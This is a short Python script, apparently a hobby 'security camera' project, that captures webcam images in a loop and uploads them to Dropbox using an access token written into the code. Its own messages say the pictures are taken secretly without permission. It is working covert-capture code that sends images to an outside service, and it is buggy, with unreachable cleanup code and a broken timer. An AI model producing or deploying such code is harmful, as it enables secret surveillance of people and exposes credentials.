import cv2
import dropbox
import time
import random

starttime = time.time()
def takesnapshot():
    number = random.randint(0,100)
    videocaptureobject = cv2.VideoCapture(0)
    result = True
    while(result):
        ret,frame = videocaptureobject.read()
        imgname = "img" + str(number) + ".png"
        cv2.imwrite(imgname, frame)
        starttime = time.time()
        result =  False
    return imgname
    print("Snapshot of u has been secretely taken without your permission")
    videocaptureobject.release()
    cv2.destroyAllWindows()
def upload_file(imgname):
    access_token = 'wpKUFxjlHHsAAAAAAAAAAT3t9RYOrKXOWB88CE9Z3GkL8U5keucN3PKe6QWj5sZL'
    file_from = imgname
    file_to = "/secutiry/" + (imgname) 
    dbx = dropbox.Dropbox(access_token)
    with open(file_from, "rb") as f:
        dbx.files_upload(f.read(), file_to, mode = dropbox.files.WriteMode.overwrite)
        print("File has been uploaded, and u gonna get busted now ")

while(True):
    if(time.time() - starttime >= 5):
        name = takesnapshot()
        upload_file(name) 




    